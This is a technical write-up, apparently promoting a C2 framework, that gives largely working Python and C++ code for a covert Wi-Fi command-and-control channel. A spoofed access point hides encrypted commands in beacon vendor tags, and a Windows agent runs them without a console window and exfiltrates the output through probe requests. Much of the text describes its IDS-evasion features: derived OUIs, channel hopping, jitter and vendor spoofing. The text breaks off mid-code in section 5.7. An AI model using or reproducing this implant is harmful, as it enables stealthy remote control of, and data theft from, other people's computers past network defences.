# Covert Wi-Fi C2 v3.0 — Vendor Specific Elements (Next-Gen)

This write-up documents a high-bandwidth covert command channel that uses **802.11 Vendor Specific Elements (Tag 221)** as a bidirectional C2 transport:

> **Project Context:** This technique is a modular component of the next-generation **Audix C2 Framework**, currently under development and scheduled for release in **Q2 2026**.
> [Learn more about the Audix C2](https://www.security-auditing.com/C2)

- **Server (Python / Kali, monitor mode):**  
  Injects beacon frames with **hidden payloads inside VSE tags**, appearing as a legitimate access point.
- **Agent (Windows / WLAN API):**  
  Scans for nearby Wi-Fi networks, parses raw Information Elements (IEs), extracts VSE payloads, reassembles commands, executes them, and **exfiltrates responses via Probe Requests**.

No association to any access point is required. A powered-on machine with a Wi-Fi card is sufficient.

---

## 1. What's New in v3.0

Version 3.0 is a full-stack rewrite with 7 major improvements:

| # | Feature | Description |
|:--|:--------|:------------|
| 1 | **AES-256-CTR** | Replaces RC4. Per-message random 12-byte nonce via BCrypt (agent) and PyCryptodome (server). |
| 2 | **ACK / Retransmit** | Agent ACKs received commands; server ACKs received responses. Both stop retransmitting on ACK. |
| 3 | **Stealth by Default** | No console window, `CreateProcess` with `CREATE_NO_WINDOW`. Use `-debug` for console output during testing. |
| 4 | **OUI Rotation** | Session OUI derived from PSK via SHA-256 — no hardcoded magic bytes for IDS to match. |
| 5 | **Job Queue** | Server-side FIFO queue. Stack multiple commands; each auto-advances after ACK. |
| 6 | **Channel Hopping** | Shared PRNG schedule derived from PSK + wall-clock time. Both sides compute the same channel independently. |

---

## 2. Evolution: v1.0 → v2.0 → v3.0

| Feature | **v1.0 (SSID)** | **v2.0 (VSE)** | **v3.0 (Next-Gen)** |
|:---|:---|:---|:---|
| **Transport** | SSID Field | VSE Tag 221 | VSE Tag 221 |
| **Encryption** | Base64 only | RC4 + Base64 | **AES-256-CTR** + Base64 |
| **Key Management** | None | Hardcoded 16B key | 32B PSK, per-message nonce |
| **Downstream BW** | ~30 B/pkt | ~1.2 KB/pkt | ~1.2 KB/pkt |
| **Upstream BW** | None | ~21 B/pkt | ~20 B/pkt |
| **Reliability** | Low | Medium (loop) | **High** (ACK + retransmit + queue) |
| **Signatures** | Visible SSIDs | Hardcoded OUI `00:40:96` | **Derived OUI** (no static fingerprint) |
| **Channel** | Fixed | Fixed (ch 6) | **Hopping** (1, 6, 11 — PRNG schedule) |
| **Agent Liveness** | Unknown | Unknown | Discovered on first ACK/response |
| **Stealth** | None | Jitter + vendor spoof | Jitter + vendor spoof + **stealth by default (no console, CreateProcess)** |
| **Multi-Command** | No | One at a time | **FIFO job queue** |

---

## 3. Over-The-Air Protocol & Frame Format

### 3.1 v3.0 Header Structure (12 bytes)

Both downstream (VSE) and upstream (Probe SSID) use the same header layout:

```text
Offset  Size  Field         Description
------  ----  -----         -----------
0       3     Session OUI   Derived from SHA-256(PSK || "WIFIAIR_OUI_V3")[:3]
3       1     Msg Type      0x01=CMD, 0x02=ACK, 0x04=RESPONSE
4       1     Agent ID      Target/source agent (0 = broadcast)
5       2     Job ID        Unique job identifier (big-endian)
7       2     Sequence      Fragment number, 1-based (big-endian)
9       2     Total         Total fragments in job (big-endian)
11      1     Flags         Bit 1: ENCRYPTED
12      N     Data          Payload fragment (base64 encoded)
```

### 3.2 Downstream Protocol (Server → Agent)

Commands are encrypted, encoded, fragmented, and wrapped in VSE tags:

```text
[ 802.11 Beacon Frame ]
   │
   ├── [ Fixed Params ] (Timestamp, Interval, Capabilities)
   ├── [ Tag 0: SSID ] = "linksys" (Stable session identity)
   ├── [ Tag 1: Rates ] = Standard supported rates
   ├── [ Tag 3: DS Parameter Set ] = Current hop channel
   │
   ├── [ Tag 221: VSE #1 ] ◄── PAYLOAD CHUNK 1
   │     └── [ OUI: derived ] [ Type: CMD ] [ Agent ] [ Job ] [ Seq ] [ Total ] [ Flags ] [ Data... ]
   ├── [ Tag 221: VSE #2 ] ◄── PAYLOAD CHUNK 2
   ├── [ Tag 221: VSE #3 ] ◄── PAYLOAD CHUNK 3
   ├── [ Tag 221: VSE #4 ] ◄── PAYLOAD CHUNK 4
   └── [ Tag 221: VSE #5 ] ◄── PAYLOAD CHUNK 5
```

**Capacity:** 5 tags × 243 bytes = **~1.2 KB per beacon** (255 byte VSE - 12 byte header = 243 data).

### 3.3 Upstream Protocol (Agent → Server)

Responses follow the same pipeline in reverse, sent via Probe Request SSIDs:

```text
[ 802.11 Probe Request ]
   └── [ Tag 0: SSID ] (32 Bytes max)
         ├── [ Session OUI (3B) ]
         ├── [ Msg Type (1B) ] : RESPONSE (0x04)
         ├── [ Agent ID (1B) ]
         ├── [ Job ID (2B) ]
         ├── [ Seq (2B) ]
         ├── [ Total (2B) ]
         ├── [ Flags (1B) ]
         └── [ Data (20B) ] : Encrypted fragment
```

**Bandwidth:** SSID is limited to 32 bytes. After 12 bytes of header, **20 bytes of payload per packet** are available for upstream exfiltration.

### 3.4 Encryption Layer: AES-256-CTR

Both directions use **AES-256-CTR** with a 32-byte pre-shared key:

```python
# Server (Python / PyCryptodome)
PSK = bytes([
    0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
    0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01,
    0xA3, 0xB2, 0xC1, 0xD0, 0xE4, 0xF5, 0x06, 0x17,
    0x28, 0x39, 0x4A, 0x5B, 0x6C, 0x7D, 0x8E, 0x9F
])
```

```cpp
// Agent (C++ / Windows BCrypt)
static const BYTE PSK[32] = {
    0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
    0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01,
    0xA3, 0xB2, 0xC1, 0xD0, 0xE4, 0xF5, 0x06, 0x17,
    0x28, 0x39, 0x4A, 0x5B, 0x6C, 0x7D, 0x8E, 0x9F
};
```

**Per-message nonce:** Every encrypt operation generates a cryptographically random 12-byte nonce. The encrypted payload format is:

```text
[ Nonce (12 bytes) ] [ AES-256-CTR Ciphertext (N bytes) ]
```

**Why AES-256-CTR over RC4:**
- RC4 has known keystream biases and is vulnerable to related-key attacks
- RC4 with a static key produces identical ciphertext for identical plaintext (fingerprinting risk)
- AES-256-CTR with a random nonce guarantees unique ciphertext for every message
- BCrypt provides hardware-accelerated AES on modern Windows

**Processing Pipeline:**

```text
Downstream: Command → [nonce || AES-256-CTR(plaintext)] → Base64 → Fragment → VSE Tags
Upstream:   Output  → [nonce || AES-256-CTR(plaintext)] → Base64 → Fragment → Probe SSIDs
```

### 3.5 OUI Derivation (No Static Signatures)

The session OUI is deterministically derived from the PSK:

```python
SESSION_OUI = SHA256(PSK + b"WIFIAIR_OUI_V3")[:3]
```

Both server and agent compute the same OUI independently. There are no hardcoded magic bytes that an IDS could fingerprint. Changing the PSK changes the OUI.

---

## 4. Server (Kali / Python / Scapy) Walkthrough

### 4.1 Session OUI & Channel Seed Derivation

At startup, the server derives two session parameters deterministically from the PSK. Because both values are computed the same way on both sides, the server and agent agree on the OUI and channel schedule without any over-the-air handshake:

```python
def derive_session_oui(psk):
    return hashlib.sha256(psk + b"WIFIAIR_OUI_V3").digest()[:3]

def derive_channel_seed(psk):
    return int.from_bytes(
        hashlib.sha256(psk + b"WIFIAIR_CHANNEL_HOP").digest()[:4], 'big')

SESSION_OUI   = derive_session_oui(PSK)
CHANNEL_SEED  = derive_channel_seed(PSK)
```

The derived OUI replaces the hardcoded `00:40:96` / `00:40:97` values from v2.0. Changing the PSK changes the OUI, so there are no static byte patterns for an IDS to fingerprint.

### 4.2 Session Identity Generation

The server generates a stable AP identity that mimics a real access point for the entire session:

```python
def generate_session_identity():
    vendor_prefixes = [
        ([0x00, 0x1A, 0x2B], "Cisco"),
        ([0x00, 0x1E, 0x58], "D-Link"),
        ([0x00, 0x24, 0xB2], "Netgear"),
        ([0x00, 0x26, 0x5A], "TP-Link"),
        ([0x00, 0x1C, 0x10], "Linksys"),
    ]
    ssid_options = ["xfinitywifi", "linksys", "NETGEAR", "ATT-WIFI-5G", "HOME-WIFI"]
    
    prefix, vendor = random.choice(vendor_prefixes)
    suffix = [random.randint(0x00, 0xFF) for _ in range(3)]
    bssid = ':'.join(f'{b:02x}' for b in prefix + suffix)
    ssid  = random.choice(ssid_options)
    
    return bssid, ssid, vendor

SESSION_BSSID, SESSION_SSID, SESSION_VENDOR = generate_session_identity()
```

This creates a consistent BSSID + SSID pair (e.g., `00:1c:10:a3:7f:12` broadcasting `linksys`) that persists for the entire server session, appearing as a single legitimate access point.

### 4.3 AES-256-CTR Encryption

v3.0 replaces RC4 with AES-256-CTR using PyCryptodome. Every encrypt operation generates a cryptographically random 12-byte nonce, so identical commands produce different ciphertext every time:

```python
from Crypto.Cipher import AES
from Crypto.Util import Counter as CryptoCounter

def aes256_ctr_encrypt(key, plaintext):
    nonce = os.urandom(12)
    ctr = CryptoCounter.new(32, prefix=nonce, initial_value=0, little_endian=False)
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
    return nonce + cipher.encrypt(plaintext)

def aes256_ctr_decrypt(key, data):
    nonce      = data[:12]
    ciphertext = data[12:]
    ctr = CryptoCounter.new(32, prefix=nonce, initial_value=0, little_endian=False)
    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
    return cipher.decrypt(ciphertext)
```

The output format is `[ 12-byte nonce ] [ ciphertext ]`. The nonce is prepended in cleartext — it is not secret, but ensures unique ciphertext per message.

### 4.4 Command Preparation & Fragmentation

Commands are encrypted, Base64-encoded, and fragmented into 243-byte chunks (255-byte VSE max minus 12-byte header):

```python
def prepare_job(command, agent_id=0):
    raw       = command.encode('utf-8')
    encrypted = aes256_ctr_encrypt(PSK, raw)
    payload   = base64.b64encode(encrypted)

    CHUNK_SZ = 243
    chunks   = [payload[i:i+CHUNK_SZ] for i in range(0, len(payload), CHUNK_SZ)]
    job_id   = struct.pack('>H', random.randint(1, 65535))
    total    = len(chunks)
    flags    = FLAG_ENCRYPTED  # 0x02

    prepared = []
    for seq, cdata in enumerate(chunks, 1):
        hdr = (SESSION_OUI
               + bytes([MSG_CMD, agent_id])
               + job_id
               + struct.pack('>H', seq)
               + struct.pack('>H', total)
               + bytes([flags]))
        prepared.append(hdr + cdata)

    return job_id, prepared, agent_id
```

Each prepared chunk is a complete VSE payload: 12-byte header + up to 243 bytes of Base64 data. The `flags` byte tells the agent the payload is encrypted (bit 1 set).

### 4.5 Beacon Frame Crafting

Beacons are crafted with Scapy. The key difference from v2.0 is the DS Parameter Set now uses the current hop channel:

```python
def create_beacon(chunks_batch, channel):
    dot11  = Dot11(type=0, subtype=8,
                   addr1='ff:ff:ff:ff:ff:ff',   # Broadcast
                   addr2=SESSION_BSSID,          # Our stable BSSID
                   addr3=SESSION_BSSID)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid  = Dot11Elt(ID='SSID', info=SESSION_SSID, len=len(SESSION_SSID))
    rates  = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
    dsset  = Dot11Elt(ID='DSset', info=bytes([channel]))
    pkt    = RadioTap()/dot11/beacon/essid/rates/dsset

    # Stack multiple VSE tags (up to 5 per beacon)
    for chunk in chunks_batch:
        pkt = pkt / Dot11Elt(ID=221, info=chunk)

    return pkt
```

ACK beacons reuse the same function with a minimal single-tag payload:

```python
def build_ack_beacon(agent_id, job_id_bytes, channel):
    header = (SESSION_OUI
              + bytes([MSG_ACK, agent_id])
              + job_id_bytes
              + struct.pack('>HH', 1, 1)    # seq=1, total=1
              + bytes([0]))                  # no flags
    return create_beacon([header], channel)
```

### 4.6 Broadcast Thread & Jitter

The broadcast loop runs in a dedicated thread, sending VSE-stacked beacons with jittered timing:

```python
def broadcast_thread():
    global broadcast_active
    while True:
        if broadcast_active and current_job:
            jid, chunks, aid = current_job
            ch = get_current_channel()
            
            # Send chunks in batches of 5 (VSE stacking)
            for i in range(0, len(chunks), TAGS_PER_BEACON):
                if not broadcast_active:
                    break
                batch = chunks[i:i+TAGS_PER_BEACON]
                sendp(create_beacon(batch, ch), iface=INTERFACE, verbose=0)
                time.sleep(jitter(BEACON_JITTER_MIN, BEACON_JITTER_MAX))
            
            # Cycle jitter between full broadcasts
            time.sleep(jitter(CYCLE_JITTER_MIN, CYCLE_JITTER_MAX))
        else:
            time.sleep(0.1)
```

The jitter values (default 80–120ms between beacons, 50–150ms between cycles) mimic real AP beacon intervals (~100ms standard). The operator can adjust these at runtime with the `jitter` command.

### 4.7 Channel Hopping Thread

A separate thread continuously hops the monitor-mode interface to the current PRNG-derived channel:

```python
CHANNELS     = [1, 6, 11]
HOP_INTERVAL = 10   # seconds per dwell

def get_current_channel():
    slot = int(time.time()) // HOP_INTERVAL
    h = ((CHANNEL_SEED + slot) * 2654435761) & 0xFFFFFFFF  # Knuth hash
    return CHANNELS[h % len(CHANNELS)]

def channel_hop_thread():
    last_ch = -1
    while True:
        if channel_hop_enabled:
            ch = get_current_channel()
            if ch != last_ch:
                os.system(f"iwconfig {INTERFACE} channel {ch} 2>/dev/null")
                last_ch = ch
        time.sleep(1)
```

Both the server and agent compute the same channel from the same PSK-derived seed and wall-clock time, so they stay synchronized without any over-the-air coordination.

### 4.8 Response Sniffing & ACK Broadcast

The server sniffs Probe Requests in a dedicated thread and parses the v3.0 12-byte header:

```python
def handle_probe(pkt):
    if not pkt.haslayer(Dot11ProbeReq) or not pkt.haslayer(Dot11Elt):
        return

    ssid = pkt[Dot11Elt].info
    if not ssid or len(ssid) < 12 or ssid[:3] != SESSION_OUI:
        return  # Not ours — wrong or missing OUI

    msg_type = ssid[3]
    agent_id = ssid[4]
    job_id   = (ssid[5] << 8) | ssid[6]

    # Update agent tracking
    if agent_id != 0:
        if agent_id not in known_agents:
            known_agents[agent_id] = {'last_seen': now, 'jobs_completed': 0}
        known_agents[agent_id]['last_seen'] = time.time()

    # Handle ACK — agent confirmed receipt of command
    if msg_type == MSG_ACK:
        # Stop broadcasting current job, advance queue
        if current_job and job_id_int(current_job[0]) == job_id:
            advance_queue()
        return

    # Handle RESPONSE — reassemble fragments
    if msg_type == MSG_RESPONSE:
        seq   = (ssid[7] << 8) | ssid[8]
        total = (ssid[9] << 8) | ssid[10]
        flags = ssid[11]
        data  = ssid[12:].decode('latin-1')

        # Buffer fragment and check for completion
        # ... (buffering logic)

        if all_fragments_received:
            full_b64 = ''.join(buf['parts'][i] for i in range(1, total + 1))
            raw = base64.b64decode(full_b64)

            if buf['flags'] & FLAG_ENCRYPTED:
                plaintext = aes256_ctr_decrypt(PSK, raw)
            else:
                plaintext = raw

            print(plaintext.decode('utf-8', errors='replace'))

            # Launch ACK broadcast in background (30 seconds)
            threading.Thread(
                target=ack_broadcast_thread,
                args=(agent_id, struct.pack('>H', job_id)),
                daemon=True
            ).start()
```

When a response is fully reassembled, the server launches a **background ACK broadcast thread** that transmits ACK beacons for 30 seconds at 100ms intervals. This runs in parallel so the operator can continue using the shell:

```python
ACK_DURATION = 30    # seconds
ACK_INTERVAL = 0.10  # 100ms between ACK beacons

def ack_broadcast_thread(agent_id, job_id_bytes):
    end_time = time.time() + ACK_DURATION
    while time.time() < end_time:
        ch = get_current_channel()
        sendp(build_ack_beacon(agent_id, job_id_bytes, ch),
              iface=INTERFACE, verbose=0)
        time.sleep(ACK_INTERVAL)
```

### 4.9 Job Queue Management

The server maintains a FIFO `deque` of prepared jobs. When the operator sends a command, it is immediately encrypted and fragmented, then queued:

```python
job_queue = deque()

def enqueue_job(command, agent_id):
    job_id, chunks, aid = prepare_job(command, agent_id)
    job_queue.append((job_id, chunks, aid))
    if not broadcast_active:
        advance_queue()

def advance_queue():
    global current_job, broadcast_active
    with state_lock:
        if job_queue:
            current_job = job_queue.popleft()
            broadcast_active = True
        else:
            current_job = None
            broadcast_active = False
```

Jobs auto-advance when the agent ACKs the current job. The operator can also manually control the queue with `stop`, `skip`, `remove`, and `flush`.

---

## 5. Agent (Windows / WLAN API / BCrypt) Walkthrough

### 5.1 PSK Derivation (OUI & Channel Seed via BCrypt SHA-256)

The agent derives the same session OUI and channel seed from the PSK using Windows BCrypt for SHA-256:

```cpp
bool ComputeSHA256(const BYTE* data, size_t len, BYTE outHash[32]) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hHash, (PUCHAR)data, (ULONG)len, 0);
    BCryptFinishHash(hHash, outHash, 32, 0);

    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return true;
}

void DeriveSessionOUI() {
    const char* suffix = "WIFIAIR_OUI_V3";
    std::vector<BYTE> input(PSK, PSK + 32);
    input.insert(input.end(), (BYTE*)suffix, (BYTE*)suffix + strlen(suffix));
    BYTE hash[32];
    ComputeSHA256(input.data(), input.size(), hash);
    memcpy(g_SessionOUI, hash, 3);  // First 3 bytes = session OUI
}
```

The channel seed is derived identically using `"WIFIAIR_CHANNEL_HOP"` as the suffix. The resulting seed feeds the same Knuth hash schedule as the server:

```cpp
int GetCurrentChannel() {
    time_t now = time(NULL);
    unsigned int slot = (unsigned int)(now / HOP_INTERVAL);
    unsigned int h = (g_ChannelSeed + slot) * 2654435761u;
    return CHANNELS[h % NUM_CHANNELS];
}
```

### 5.2 AES-256-CTR via BCrypt (ECB + Manual Counter)

Windows BCrypt doesn't expose a native CTR mode, so the agent implements it manually using AES-ECB to generate keystream blocks and XORing them with the data:

```cpp
bool AES256CTR_Process(const BYTE key[32], const BYTE nonce12[12],
                       BYTE* data, size_t dataLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0);

    // Build 16-byte counter block: [ 12-byte nonce ] [ 4-byte counter ]
    BYTE counter[16] = { 0 };
    memcpy(counter, nonce12, 12);

    BYTE keystream[16];
    ULONG cbResult;

    for (size_t offset = 0; offset < dataLen; offset += 16) {
        BYTE counterCopy[16];
        memcpy(counterCopy, counter, 16);

        // Encrypt counter block to produce keystream
        BCryptEncrypt(hKey, counterCopy, 16, NULL, NULL, 0,
                      keystream, 16, &cbResult, 0);

        // XOR keystream with data
        size_t blockLen = min((size_t)16, dataLen - offset);
        for (size_t i = 0; i < blockLen; i++)
            data[offset + i] ^= keystream[i];

        // Increment counter (big-endian, last 4 bytes)
        for (int i = 15; i >= 12; i--) {
            if (++counter[i] != 0) break;
        }
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return true;
}
```

Encryption and decryption both use `AES256CTR_Process` — CTR mode is symmetric. The encrypt wrapper generates a random 12-byte nonce via `BCryptGenRandom` and prepends it:

```cpp
std::vector<BYTE> AES256CTR_Encrypt(const BYTE key[32],
                                     const BYTE* plaintext, size_t len) {
    BYTE nonce[12];
    GenerateRandom(nonce, 12);                    // BCryptGenRandom
    std::vector<BYTE> result(12 + len);
    memcpy(result.data(), nonce, 12);             // Nonce prefix
    memcpy(result.data() + 12, plaintext, len);   // Copy plaintext
    AES256CTR_Process(key, nonce, result.data() + 12, len);  // XOR in place
    return result;
}

std::vector<BYTE> AES256CTR_Decrypt(const BYTE key[32],
                                     const BYTE* data, size_t len) {
    if (len < 12) return {};
    BYTE nonce[12];
    memcpy(nonce, data, 12);                      // Extract nonce
    size_t ctLen = len - 12;
    std::vector<BYTE> plaintext(ctLen);
    memcpy(plaintext.data(), data + 12, ctLen);
    AES256CTR_Process(key, nonce, plaintext.data(), ctLen);   // XOR = decrypt
    return plaintext;
}
```

### 5.3 WLAN Enumeration & Scan Loop

The agent uses the Windows WLAN API to open a handle, enumerate interfaces, and enter a continuous scan loop:

```cpp
void ScanLoop() {
    HANDLE hClient = NULL;
    DWORD dwVer = 0;
    WlanOpenHandle(2, NULL, &dwVer, &hClient);

    // Register scan-complete notification
    g_hScanComplete = CreateEvent(NULL, FALSE, FALSE, NULL);
    WlanRegisterNotification(hClient, WLAN_NOTIFICATION_SOURCE_ACM, TRUE,
        (WLAN_NOTIFICATION_CALLBACK)WlanNotificationCallback, NULL, NULL, NULL);

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    WlanEnumInterfaces(hClient, NULL, &pIfList);
    GUID* pGuid = &pIfList->InterfaceInfo[0].InterfaceGuid;

    while (true) {
        // --- Drain exfil queue if pending ---
        if (g_ExfilEnabled && !g_ExfilQueue.empty()) {
            // ... (exfil processing, see 5.6)
        }

        // --- Normal scan ---
        WlanScan(hClient, pGuid, NULL, NULL, NULL);
        WaitForSingleObject(g_hScanComplete, 500);

        PWLAN_BSS_LIST pBssList = NULL;
        if (WlanGetNetworkBssList(hClient, pGuid, NULL, dot11_BSS_type_any,
                                  FALSE, NULL, &pBssList) == ERROR_SUCCESS) {
            for (DWORD i = 0; i < pBssList->dwNumberOfItems; i++) {
                PWLAN_BSS_ENTRY pEntry = &pBssList->wlanBssEntries[i];
                if (pEntry->ulIeSize > 0)
                    ParseVSE(hClient, pGuid,
                             (PBYTE)pEntry + pEntry->ulIeOffset, pEntry->ulIeSize);
            }
            WlanFreeMemory(pBssList);
        }

        // --- Prune stale jobs (every 60s) ---
        // Active jobs older than 2 minutes are discarded
        // Completed jobs set is cleared at 1000 entries
    }
}
```

The notification callback signals scan completion via a Windows Event object:

```cpp
VOID WINAPI WlanNotificationCallback(PWLAN_NOTIFICATION_DATA pData, PVOID pCtx) {
    if (pData != NULL &&
        pData->NotificationSource == WLAN_NOTIFICATION_SOURCE_ACM &&
        pData->NotificationCode == wlan_notification_acm_scan_complete) {
        SetEvent(g_hScanComplete);
    }
}
```

### 5.4 VSE Parsing & Command Extraction

The agent walks the raw IE byte array from `WlanGetNetworkBssList`, looking for Tag 221 entries whose first 3 bytes match the derived session OUI:

```cpp
void ParseVSE(HANDLE hClient, GUID* pGuid, PBYTE pRawData, DWORD dwSize) {
    DWORD offset = 0;

    while (offset + 2 <= dwSize) {
        BYTE ieID  = pRawData[offset];
        BYTE ieLen = pRawData[offset + 1];
        if (offset + 2 + ieLen > dwSize) break;
        PBYTE ieData = &pRawData[offset + 2];

        // Check for our VSE (Tag 221, derived OUI, min 12 bytes)
        if (ieID == 221 && ieLen >= 12 &&
            memcmp(ieData, g_SessionOUI, 3) == 0) {

            // Parse v3.0 header (12 bytes)
            BYTE msgType           = ieData[3];
            BYTE targetAgent       = ieData[4];
            unsigned short jobId   = (ieData[5] << 8) | ieData[6];
            unsigned short seq     = (ieData[7] << 8) | ieData[8];
            unsigned short total   = (ieData[9] << 8) | ieData[10];
            BYTE flags             = ieData[11];

            // Handle ACK from server (see 5.7)
            if (msgType == MSG_ACK) {
                if (targetAgent == g_AgentId || targetAgent == 0)
                    g_AckedJobs.insert(jobId);
                offset += (2 + ieLen);
                continue;
            }

            // Only process CMD messages
            if (msgType != MSG_CMD) { offset += (2 + ieLen); continue; }

            // Check targeting (0 = broadcast, else must match our ID)
            if (targetAgent != 0 && targetAgent != g_AgentId) {
                offset += (2 + ieLen);
                continue;
            }

            // Skip already-completed jobs
            if (completed_jobs.count(jobId)) { offset += (2 + ieLen); continue; }

            // Extract data chunk (starts at offset 12, not 10 like v2.0)
            std::string chunk((char*)(ieData + 12), ieLen - 12);

            // Store in job buffer
            JobBuffer& buf = active_jobs[jobId];
            buf.total_chunks = total;
            buf.timestamp = GetTickCount();
            buf.parts[seq] = chunk;

            // Check if job is complete
            if (buf.parts.size() == total) {
                std::string full_b64;
                for (unsigned short i = 1; i <= total; i++)
                    full_b64 += buf.parts[i];

                completed_jobs.insert(jobId);
                active_jobs.erase(jobId);

                // Decrypt (AES-256-CTR instead of RC4)
                std::vector<BYTE> raw = Base64Decode(full_b64);
                std::vector<BYTE> plaintext;
                if (flags & FLAG_ENCRYPTED)
                    plaintext = AES256CTR_Decrypt(PSK, raw.data(), raw.size());
                else
                    plaintext = raw;

                std::string cmd(plaintext.begin(), plaintext.end());

                // Send ACK (only if upstream is enabled)
                if (g_ExfilEnabled)
                    SendAckProbe(hClient, pGuid, jobId);

                // Execute and queue response
                std::string output = ExecCommand(cmd);
                if (g_ExfilEnabled) {
                    ExfilJob ej;
                    ej.jobId = jobId;
                    ej.output = output;
                    g_ExfilQueue.push(ej);
                }
            }
        }
        offset += (2 + ieLen);
    }
}
```

### 5.5 ACK Probe Transmission

When the agent finishes reassembling a command, it immediately sends an ACK probe (if exfil is enabled). The ACK uses the v3.0 12-byte header with `MSG_ACK` (0x02) and is repeated 3 times for reliability:

```cpp
void SendAckProbe(HANDLE hClient, GUID* pGuid, unsigned short jobId) {
    DOT11_SSID ssid = { 0 };
    ssid.ucSSID[0]  = g_SessionOUI[0];
    ssid.ucSSID[1]  = g_SessionOUI[1];
    ssid.ucSSID[2]  = g_SessionOUI[2];
    ssid.ucSSID[3]  = MSG_ACK;          // 0x02
    ssid.ucSSID[4]  = g_AgentId;
    ssid.ucSSID[5]  = (jobId >> 8) & 0xFF;
    ssid.ucSSID[6]  = jobId & 0xFF;
    ssid.ucSSID[7]  = 0x00; ssid.ucSSID[8]  = 0x01;  // seq=1
    ssid.ucSSID[9]  = 0x00; ssid.ucSSID[10] = 0x01;  // total=1
    ssid.ucSSID[11] = 0x00;                            // no flags
    ssid.uSSIDLength = 12;

    for (int i = 0; i < 3; i++) {
        WlanScan(hClient, pGuid, &ssid, NULL, NULL);
        Sleep(Jitter(200, 500));
    }
}
```

### 5.6 Response Exfiltration via Probe Requests (Encrypt-Once)

Response exfiltration has two stages. First, the payload is encrypted **once** before entering the retransmit loop. This is critical — it guarantees all retransmit passes produce identical fragments, so the server can mix and match chunks from different passes:

```cpp
struct PreparedExfil {
    std::string    b64;
    unsigned short total;
    BYTE           flags;
};

PreparedExfil PrepareExfilPayload(const std::string& rawOutput) {
    PreparedExfil pe;
    std::vector<BYTE> toEncrypt(rawOutput.begin(), rawOutput.end());
    std::vector<BYTE> encrypted = AES256CTR_Encrypt(PSK,
                                      toEncrypt.data(), toEncrypt.size());
    pe.b64   = Base64Encode(encrypted);
    pe.flags = FLAG_ENCRYPTED;
    const size_t CHUNK_SIZE = 20;  // 32 - 12 header = 20 bytes per probe
    pe.total = (unsigned short)((pe.b64.size() + CHUNK_SIZE - 1) / CHUNK_SIZE);
    return pe;
}
```

Then `SendExfilSequence` sends one full pass of all chunks as Probe Request SSIDs, with per-chunk retry logic:

```cpp
void SendExfilSequence(HANDLE hClient, GUID* pGuid, unsigned short jobId,
                       const PreparedExfil& pe) {
    Sleep(1500);  // Brief delay before starting
    const size_t CHUNK_SIZE = 20;

    for (int i = 0; i < (int)pe.total; i++) {
        // Check for server ACK or duration timeout
        if (g_AckedJobs.count(jobId)) return;

        unsigned short seq = (unsigned short)(i + 1);
        std::string chunk = pe.b64.substr(i * CHUNK_SIZE,
                                min(CHUNK_SIZE, pe.b64.size() - i * CHUNK_SIZE));

        // Build 12-byte v3.0 header + data
        DOT11_SSID ssid = { 0 };
        ssid.ucSSID[0]  = g_SessionOUI[0];
        ssid.ucSSID[1]  = g_SessionOUI[1];
        ssid.ucSSID[2]  = g_SessionOUI[2];
        ssid.ucSSID[3]  = MSG_RESPONSE;      // 0x04
        ssid.ucSSID[4]  = g_AgentId;
        ssid.ucSSID[5]  = (jobId >> 8) & 0xFF;
        ssid.ucSSID[6]  = jobId & 0xFF;
        ssid.ucSSID[7]  = (seq >> 8) & 0xFF;
        ssid.ucSSID[8]  = seq & 0xFF;
        ssid.ucSSID[9]  = (pe.total >> 8) & 0xFF;
        ssid.ucSSID[10] = pe.total & 0xFF;
        ssid.ucSSID[11] = pe.flags;
        memcpy(&ssid.ucSSID[12], chunk.c_str(), chunk.size());
        ssid.uSSIDLength = 12 + (ULONG)chunk.size();

        // Retry up to 3 times per chunk
        bool success = false;
        for (int retry = 0; retry < 3 && !success; retry++) {
            DWORD result = WlanScan(hClient, pGuid, &ssid, NULL, NULL);
            if (result == ERROR_SUCCESS) success = true;
            else Sleep(3000);  // Driver busy, wait before retry
        }

        Sleep(Jitter(g_ExfilJitterMin, g_ExfilJitterMax));
    }
}
```

### 5.7 Inter-Pass Scanning & Server ACK Detection

Between retransmit passes, the agent performs a **quick scan** to check for a server ACK beacon. If found, exfil stops immediately — even if the `-duration` timeout hasn't expired:

```cpp
// Inside the exfil drain loop in ScanLoop():
while (!g_ExfilQueue.empty()) {
    ExfilJob ej = g_ExfilQueue.front();
    g_ExfilQueue.pop();

    // Encrypt ONCE — reuse across all passes
    PreparedExfil pe = PrepareExfilPayload(ej.output);

    DWORD jobStart = GetTickCount();
    while (true) {
        // Check timeout and ACK
        if (g_ExfilDurationMs > 0 &&
            (GetTickCount() - jobStart > g_ExfilDurationMs)) break;
        if (g_AckedJobs.count(ej.jobId)) break;

        // Send one full pass
        SendExfilSequence(hClient, pGuid, ej.jobId, pe);
        if (g_AckedJobs.count(ej.jobId)) break;

        // Quick scan: check for server ACK beacon
        WlanScan(hClient, pGuid, NULL, NULL, NULL);
        WaitForSingleObject(g_hScanComplete, 500);
        PWLAN_BSS_LIST pAckList = NULL;
        if (WlanGetNetworkBssList(hClient, pGuid, NULL, dot11_BSS_type_any,
                                  FALSE, NULL, &pAckList) == ERROR_SUCCESS) {
